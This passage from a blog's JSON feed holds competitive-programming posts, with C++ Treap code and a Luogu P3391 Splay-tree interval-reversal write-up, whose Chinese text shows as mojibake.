class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cmath&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">randad</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">static</span> <span class=\"type\">int</span> seed=<span class=\"number\">114</span>; <span class=\"comment\">//seedå¯ä»¥éšä¾¿å–</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> seed=<span class=\"built_in\">int</span>(seed*<span class=\"number\">48271LL</span>%<span class=\"number\">2147483647</span>);<span class=\"comment\">//48271ä½¿å¾—å…¶æœ‰å®Œå…¨å‘¨æœŸï¼Œå³2147483647å†…å–éä¸é‡å¤ </span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Treap</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> key,pri,son[<span class=\"number\">2</span>];</span><br><span class=\"line\">&#125;T[<span class=\"number\">33333</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> cnt=<span class=\"number\">1</span>,rt=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">rotate</span><span class=\"params\">(<span class=\"type\">int</span> p,<span class=\"type\">int</span> &amp;rt)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> y=T[rt].son[p];</span><br><span class=\"line\">    T[rt].son[p]=T[y].son[!p];</span><br><span class=\"line\">    T[y].son[!p]=rt;</span><br><span class=\"line\">    rt=y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ins</span><span class=\"params\">(<span class=\"type\">int</span> key,<span class=\"type\">int</span> &amp;rt)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(rt==<span class=\"number\">0</span>)</span><br><span class=\"line\">    \tT[rt=cnt++] = (Treap)&#123;key,<span class=\"built_in\">randad</span>()&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> p=key&gt;T[rt].key;</span><br><span class=\"line\">        <span class=\"built_in\">ins</span>(key,T[rt].son[p]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(T[T[rt].son[p]].pri&gt;T[rt].pri)</span><br><span class=\"line\">        \t<span class=\"built_in\">rotate</span>(p,rt);   </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">nowMin</span><span class=\"params\">(<span class=\"type\">int</span> key,<span class=\"type\">int</span> rt)</span><span class=\"comment\">//æŸ¥è¯¢ç°åœ¨æœ€æ¥è¿‘keyçš„æ•°</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(rt==<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"number\">666666666</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> res=<span class=\"built_in\">abs</span>(key-T[rt].key);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(key&gt;T[rt].key) res=<span class=\"built_in\">min</span>(res,<span class=\"built_in\">nowMin</span>(key,T[rt].son[<span class=\"number\">1</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(key&lt;T[rt].key) res=<span class=\"built_in\">min</span>(res,<span class=\"built_in\">nowMin</span>(key,T[rt].son[<span class=\"number\">0</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> n,tot=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;n);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> num;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;num);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i==<span class=\"number\">1</span>) tot+=num;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> tot+=<span class=\"built_in\">nowMin</span>(num,rt);<span class=\"comment\">//rtæ˜¯å½“å‰æ ¹</span></span><br><span class=\"line\">        <span class=\"built_in\">ins</span>(num,rt);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>,tot);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>",
            "tags": [
                "Treap"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/",
            "url": "http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/",
            "title": "æ´›è°·:P3391 ã€æ¨¡æ¿ã€‘æ–‡è‰ºå¹³è¡¡æ ‘ï¼ˆSplayï¼‰",
            "date_published": "2018-02-22T15:43:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href=\"//www.luogu.org/problemnew/show/P3391\">https://www.luogu.org/problemnew/show/P3391</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>æ‚¨éœ€è¦å†™ä¸€ç§æ•°æ®ç»“æ„ï¼ˆå¯å‚è€ƒé¢˜ç›®æ ‡é¢˜ï¼‰ï¼Œæ¥ç»´æŠ¤ä¸€ä¸ªæœ‰åºæ•°åˆ—ï¼Œå…¶ä¸­éœ€è¦æä¾›ä»¥ä¸‹æ“ä½œï¼š<br>ç¿»è½¬ä¸€ä¸ªåŒºé—´ï¼Œä¾‹å¦‚åŸæœ‰åºåºåˆ—æ˜¯5 4 3 2 1ï¼Œç¿»è½¬åŒºé—´æ˜¯[2,4]çš„è¯ï¼Œç»“æœæ˜¯5 2 3 4 1</p>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>Splayæ˜¯ä¸€ç§äºŒå‰æœç´¢æ ‘ã€‚å¦‚æœä¸çŸ¥é“çš„è¯â€¦â€¦    </p>\n<p><img src=\"https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172651966-1911354100.png\" alt=\"ç™¾åº¦å•Š\" loading=\"lazy\"><br>ç™¾åº¦ç™¾ç§‘å¯¹BSTçš„ä»‹ç»ï¼š  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆBinary Search Treeï¼‰ï¼Œï¼ˆåˆï¼šäºŒå‰æœç´¢æ ‘ï¼ŒäºŒå‰æ’åºæ ‘ï¼‰å®ƒæˆ–è€…æ˜¯ä¸€æ£µç©ºæ ‘ï¼Œæˆ–è€…æ˜¯å…·æœ‰ä¸‹åˆ—æ€§è´¨çš„äºŒå‰æ ‘ï¼š è‹¥å®ƒçš„å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼› è‹¥å®ƒçš„å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼› å®ƒçš„å·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æ’åºæ ‘ã€‚</span><br></pre></td></tr></table></figure>\n<p>é¦–å…ˆæ˜ç™½Splayæ¯”èµ·çº¿æ®µæ ‘èƒ½å¤šå¹²ä»€ä¹ˆï¼š</p>\n<ul>\n<li>å¯ä»¥åœ¨ä¸€ä¸ªæœ‰åºåºåˆ—ä¸­ä»»æ„æ•°åé¢åŠ¨æ€æ’å…¥ä¸€ä¸²æ•°ï¼ˆä¸èƒ½æ¯”aåé¢ä¸€ä¸ªæ•°è¿˜å¤§ï¼‰  </li>\n<li>å¯ä»¥åˆ é™¤ä¸€æ®µåŒºé—´</li>\n</ul>\n<p>å¯èƒ½æè¿°ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå…·ä½“çœ‹è¿™é‡Œé¢ç»™çš„è®ºæ–‡é“¾æ¥ï¼š<a href=\"//www.cnblogs.com/yyy2015c01/p/8457795.html\">ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†</a><br>æˆ–è€…ç›´æ¥çœ‹è¿™é‡Œï¼š<a href=\"//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf\">è¿ç”¨ä¼¸å±•æ ‘è§£å†³æ•°åˆ—ç»´æŠ¤é—®é¢˜.pdf</a><br>å¦‚æœæä¸æ‡‚å·¦æ—‹å³æ—‹æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å…ˆçœ‹<a href=\"//www.cnblogs.com/yyy2015c01/p/8457795.html\">ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†</a>é‡Œçš„AVLæ ‘ä»‹ç»ã€‚<br>å¯¹äºAVLæ ‘æ˜¯ä¸€ç§ä¸ºäº†é˜²æ­¢æ ‘ç»“æ„ä¸å¤Ÿä¼˜å¯¼è‡´æ·±åº¦è¿‡æ·±æ—¶é—´å¤æ‚åº¦é€€åŒ–ï¼Œåœ¨ä¿æŒäºŒå‰æœç´¢æ ‘æ€§è´¨ä¸å˜çš„å‰æä¸‹è¿›è¡Œçš„ä¸€ç§å˜æ¢ã€‚ç®€å•è¯´å°±æ˜¯æŠŠå¾€ä¸€è¾¹æ²‰çš„æ ‘å¼„çš„ä¸¤è¾¹å¹³è¡¡äº›ã€‚<br>è€Œåœ¨Splayä¸­ï¼Œå°†ç‰¹å®šç‚¹æ—‹è½¬åˆ°ä¸€å®šä½ç½®å¯ä»¥è¿›è¡Œæå–åŒºé—´ç­‰æ“ä½œï¼ŒåŒæ—¶å„ç§æ—‹è½¬é—´æ¥çš„ä½¿æ ‘**åŸºæœ¬å¹³è¡¡(æ˜¯çš„ï¼Œå¯ä»¥æ„é€ æ•°æ®å¡æ‰ã€‚Treapæ ‘å¯¹æ­¤è¡¨ç¤ºåŒæƒ…)**ã€‚  </p>\n<hr>\n<p>å·¦æ—‹ï¼ˆä¸‹é¢ä»£ç é‡Œçš„è¡¨è¾¾:æŠŠSå¾€ä¸Šè½¬ä¸€æ¬¡ï¼‰â†’<img src=\"https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235430206-1994690340.gif\" alt=\"å·¦æ—‹\" loading=\"lazy\">  </p>\n<hr>\n<p>å³æ—‹ï¼ˆä¸‹é¢ä»£ç é‡Œçš„è¡¨è¾¾:æŠŠEå¾€ä¸Šè½¬ä¸€æ¬¡ï¼‰â†’<img src=\"https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235503124-141509937.gif\" alt=\"å³æ—‹\" loading=\"lazy\">  </p>\n<hr>\n<p>å›¾ç‰‡æ¥æºï¼š<a href=\"//blog.csdn.net/sun_tttt/article/details/65445754\">http://blog.csdn.net/sun_tttt&#x2F;article&#x2F;details&#x2F;65445754</a><br>(æ–‡ç« æ˜¯ä»‹ç»çº¢é»‘æ ‘çš„ä½†æ˜¯è¿™ä¸ªå·¦æ—‹å³æ—‹æ“ä½œäºŒå‰æœç´¢æ ‘é€šç”¨)<br>è®ºæ–‡é‡Œè®²çš„å¾ˆè¯¦ç»†~<br>å…·ä½“åˆ°è¿™é“é¢˜ï¼Œå¼•ç”¨ä¸€ä¸‹zcyskyåœ¨é¢˜è§£é‡Œç»™å‡ºçš„è§£é‡Šï¼š  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Splayå¯ä»¥ç”¨æ¥ç»´æŠ¤åºåˆ—ã€‚è¿™æ ·çš„è¯æ˜¯æŠŠSplayå½“ä½œä¸€æ£µåŒºé—´æ ‘ã€‚  </span><br><span class=\"line\">æ‰€è°“åŒºé—´æ ‘å’Œæƒå€¼æ ‘çš„åŒºåˆ«ï¼Œå¤§æ¦‚å°±æ˜¯åŒºé—´æ ‘æ¯ä¸ªèŠ‚ç‚¹ä»£è¡¨çš„æ˜¯ä¸€æ®µåŒºé—´ï¼ˆå…¸å‹ä»£è¡¨å°±æ˜¯ä¸€èˆ¬çš„çº¿æ®µæ ‘ï¼‰  </span><br><span class=\"line\">æƒå€¼æ ‘å¥½ç†è§£ä¸€ç‚¹ï¼Œå°±æ˜¯æ¯ä¸ªç‚¹çœŸçš„ä»£è¡¨ä¸€ä¸ªç‚¹ã€‚  </span><br><span class=\"line\">è‡³äºç¿»è½¬æ“ä½œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Splayçš„è¿‡ç¨‹å®ç°ã€‚è¯¦è§ä»£ç ã€‚(Splayèƒ½ç»´æŠ¤åºåˆ—åè½¬ä¹Ÿæ˜¯å®ƒä½œä¸ºLCTçš„è¾…åŠ©æ ‘çš„æ¡ä»¶ä¹‹ä¸€)</span><br></pre></td></tr></table></figure>\n<p>ä½œä¸ºæ¨¡æ¿é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚è¿™è¾¹æ–‡ç« ä¸»è¦è®°å½•æ¿å­ç”¨ã€‚æ„Ÿè°¢zcyskyçš„æ¿å­ã€‚   </p>\n<h2 id><a href=\"#\" class=\"headerlink\" title></a><img src=\"https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172902355-916514534.gif\" loading=\"lazy\"></h2><h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N 100005</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"type\">int</span> n,m; </span><br><span class=\"line\"><span class=\"type\">int</span> fa[N],ch[N][<span class=\"number\">2</span>],size[N],rev[N],rt;<span class=\"comment\">//fa[a]è¡¨ç¤ºaçš„çˆ¶äº²</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">pushup</span><span class=\"params\">(<span class=\"type\">int</span> x)</span><span class=\"comment\">//ç»´æŠ¤èŠ‚ç‚¹å¤§å°</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    size[x]=size[ch[x][<span class=\"number\">0</span>]]+size[ch[x][<span class=\"number\">1</span>]]+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">pushdown</span><span class=\"params\">(<span class=\"type\">int</span> x)</span><span class=\"comment\">//æ ‡è®°ä¸‹ä¼ </span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(rev[x])&#123;<span class=\"comment\">//æ˜¯å¦ç¿»è½¬äº†åŒºé—´</span></span><br><span class=\"line\">        <span class=\"built_in\">swap</span>(ch[x][<span class=\"number\">0</span>],ch[x][<span class=\"number\">1</span>]);</span><br><span class=\"line\">        rev[ch[x][<span class=\"number\">0</span>]]^=<span class=\"number\">1</span>;rev[ch[x][<span class=\"number\">1</span>]]^=<span class=\"number\">1</span>;rev[x]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">isLeft</span><span class=\"params\">(<span class=\"type\">int</span> x)</span> </span>&#123;<span class=\"keyword\">return</span> ch[fa[x]][<span class=\"number\">0</span>] == x;&#125;<span class=\"comment\">//åˆ¤æ–­xæ˜¯ä¸æ˜¯å·¦å„¿å­</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">rotate</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> &amp;k)</span><span class=\"comment\">//æ—‹è½¬</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> y=fa[x],z=fa[y];</span><br><span class=\"line\">\t<span class=\"type\">int</span> kind=<span class=\"built_in\">isLeft</span>(x);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(y==k)</span><br><span class=\"line\">        k=x;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        ch[z][!<span class=\"built_in\">isLeft</span>(y)]=x;</span><br><span class=\"line\">    ch[y][!kind]=ch[x][kind];</span><br><span class=\"line\">    </span><br><span class=\"line\">    fa[ch[y][!kind]]=y;</span><br><span class=\"line\">    ch[x][kind]=y;</span><br><span class=\"line\">    fa[y]=x;fa[x]=z;</span><br><span class=\"line\">    <span class=\"built_in\">pushup</span>(x);<span class=\"built_in\">pushup</span>(y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">splay</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> &amp;k)</span><span class=\"comment\">//ä¼¸å±•æ“ä½œï¼Œå°†xä¸€ç›´æ—‹è½¬ç›´åˆ°xå°±æ˜¯k</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(x!=k)&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> y=fa[x],z=fa[y];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(y!=k)</span><br><span class=\"line\">        \t<span class=\"built_in\">isLeft</span>(x)^<span class=\"built_in\">isLeft</span>(y) ? <span class=\"built_in\">rotate</span>(x,k):<span class=\"built_in\">rotate</span>(y,k);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//è¯¥èŠ‚ç‚¹ä¸çˆ¶äº²åˆ†åˆ«æ˜¯ä»–ä»¬çˆ¸çš„å·¦å­©å­\\å³å­©å­æˆ–è€…æ˜¯å³å­©å­\\å·¦å­©å­æ—‹è½¬2æ¬¡x</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//è¯¥èŠ‚ç‚¹ä¸çˆ¶äº²åŒæ˜¯ä»–ä»¬çˆ¸çš„å·¦å­©å­æˆ–åŒæ˜¯å³å­©å­å…ˆæ—‹è½¬ä¸€æ¬¡yå†æ—‹è½¬ä¸€æ¬¡x</span></span><br><span class=\"line\">        <span class=\"built_in\">rotate</span>(x,k);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">build</span><span class=\"params\">(<span class=\"type\">int</span> l,<span class=\"type\">int</span> r,<span class=\"type\">int</span> f)</span> <span class=\"comment\">//å»ºç«‹ä¸€é¢—å®Œå…¨å¹³è¡¡çš„äºŒå‰æ ‘</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(l&gt;r)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> mid=(l+r)/<span class=\"number\">2</span>;</span><br><span class=\"line\">    ch[f][!(mid&lt;f)]=mid;</span><br><span class=\"line\">    fa[mid]=f;</span><br><span class=\"line\">    size[mid]=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(l==r)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"built_in\">build</span>(l,mid<span class=\"number\">-1</span>,mid);</span><br><span class=\"line\">    <span class=\"built_in\">build</span>(mid+<span class=\"number\">1</span>,r,mid);</span><br><span class=\"line\">    <span class=\"built_in\">pushup</span>(mid);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> k)</span><span class=\"comment\">//å¯»æ‰¾ä»¥xä¸ºæ ¹çš„å­æ ‘é‡Œç¬¬kå¤§çš„</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">pushdown</span>(x);</span><br><span class=\"line\">    <span class=\"type\">int</span> s=size[ch[x][<span class=\"number\">0</span>]];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(k==s+<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(k&lt;=s)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">find</span>(ch[x][<span class=\"number\">0</span>],k);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">find</span>(ch[x][<span class=\"number\">1</span>],k-s<span class=\"number\">-1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">rever</span><span class=\"params\">(<span class=\"type\">int</span> l,<span class=\"type\">int</span> r)</span><span class=\"comment\">//å…³äºå¦‚ä½•ä»Splayä¸­æå–åŒºé—´è¯·çœ‹ä¸Šæ–‡æ€è·¯ä¸­çš„è®ºæ–‡</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x=<span class=\"built_in\">find</span>(rt,l),y=<span class=\"built_in\">find</span>(rt,r+<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">splay</span>(x,rt);</span><br><span class=\"line\">    <span class=\"built_in\">splay</span>(y,ch[x][<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"type\">int</span> z=ch[y][<span class=\"number\">0</span>];</span><br><span class=\"line\">    rev[z]^=<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class=\"line\">    rt=(n+<span class=\"number\">3</span>)/<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"built_in\">build</span>(<span class=\"number\">1</span>,n+<span class=\"number\">2</span>,rt);<span class=\"comment\">//åŒºé—´å·¦å³å„å¤šåŠ 1ä¸ªæ•°æ–¹ä¾¿æå–åŒºé—´</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=m;i++)&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> L,R;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;L,&amp;R);</span><br><span class=\"line\">        <span class=\"built_in\">rever</span>(L,R);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">2</span>;i&lt;=n+<span class=\"number\">1</span>;i++)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,<span class=\"built_in\">find</span>(rt,i)<span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "Splay"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/",
            "url": "http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/",
            "title": "æ´›è°·:P3384 ã€æ¨¡æ¿ã€‘æ ‘é“¾å‰–åˆ†",
            "date_published": "2018-02-21T16:08:00.000Z",
